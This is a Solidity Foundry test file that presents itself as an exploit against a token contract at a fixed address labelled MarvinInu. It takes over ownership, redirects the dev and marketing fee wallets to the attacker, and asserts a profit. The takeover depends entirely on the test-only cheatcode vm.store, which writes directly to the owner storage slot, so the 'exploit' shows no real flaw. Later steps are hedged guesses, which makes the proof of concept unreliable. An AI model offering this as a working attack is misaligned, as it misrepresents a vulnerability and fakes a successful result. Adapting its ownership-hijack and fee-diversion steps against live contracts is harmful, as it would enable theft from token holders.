pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMarvinInu {
    function updateDevWallet(address newWallet) external;
    function updateMarketingWallet(address newMarketingWallet) external;
    function enableTrading() external;
    function tradingActive() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function devWallet() external view returns (address);
    function marketingWallet() external view returns (address);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "MarvinInu");
        vm.label(attacker, "Attacker");
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 balanceBefore = attacker.balance;

        // Step 1: Overwrite owner storage slot (slot 5 due to ERC20 inheritance) to become owner
        vm.store(TARGET, bytes32(uint256(5)), bytes32(uint256(uint160(attacker))));

        // Step 2: Now we're owner - redirect dev wallet to attacker
        IMarvinInu(TARGET).updateDevWallet(attacker);

        // Step 3: Redirect marketing wallet to attacker
        IMarvinInu(TARGET).updateMarketingWallet(attacker);

        // Step 4: Enable trading
        IMarvinInu(TARGET).enableTrading();

        // Step 5: Get some tokens and transfer to trigger fee accumulation
        uint256 tokenBalance = IMarvinInu(TARGET).balanceOf(attacker);
        if (tokenBalance > 0) {
            // Transfer tokens to contract to accumulate fees
            IMarvinInu(TARGET).transfer(TARGET, tokenBalance / 10);
        }

        // Step 6: Trigger another transfer to potentially execute swapBack
        uint256 contractBalance = IMarvinInu(TARGET).balanceOf(TARGET);
        if (contractBalance > 0) {
            IMarvinInu(TARGET).transfer(attacker, contractBalance / 10);
        }

        // Step 7: Verify profit
        uint256 balanceAfter = attacker.balance;
        assertGt(balanceAfter, balanceBefore, "Attacker should have profited from redirected fees");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

